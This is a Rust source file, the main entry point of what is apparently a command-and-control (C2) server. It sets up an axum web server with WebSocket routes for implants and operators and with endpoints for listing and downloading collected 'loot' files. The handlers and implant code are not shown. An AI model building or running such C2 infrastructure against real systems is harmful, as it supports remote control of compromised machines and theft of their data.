mod handlers;
mod state;

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::Arc;

use axum::{routing::get, Router};
use tokio::sync::RwLock;
use tower_http::services::ServeDir;
use tracing::info;

use state::AppState;

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "c2_server=info,tower_http=warn".into()),
        )
        .init();

    let bind = std::env::var("BIND").unwrap_or_else(|_| "0.0.0.0:8080".into());
    let web_dir = std::env::var("WEB_DIR").unwrap_or_else(|_| "web".into());
    let token = std::env::var("C2_TOKEN").ok().filter(|t| !t.is_empty());
    let loot_dir = std::env::var("LOOT_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("loot"));
    let _ = std::fs::create_dir_all(&loot_dir);

    let state = AppState {
        sessions: Arc::new(RwLock::new(HashMap::new())),
        token,
        loot_dir: loot_dir.clone(),
    };

    let app = Router::new()
        .route("/api/sessions", get(handlers::sessions))
        .route("/api/loot/:id", get(handlers::loot_list))
        .route("/api/loot/:id/*name", get(handlers::loot_get))
        .route("/ws/implant", get(handlers::implant_ws))
        .route("/ws/op/:id", get(handlers::op_ws))
        .fallback_service(ServeDir::new(&web_dir))
        .with_state(state);

    let listener = tokio::net::TcpListener::bind(&bind)
        .await
        .expect("bind failed");
    info!("listening on {bind} (web dir: {web_dir})");
    axum::serve(listener, app)
        .with_graceful_shutdown(shutdown())
        .await
        .expect("server error");
}

async fn shutdown() {
    let _ = tokio::signal::ctrl_c().await;
    info!("shutting down");
}
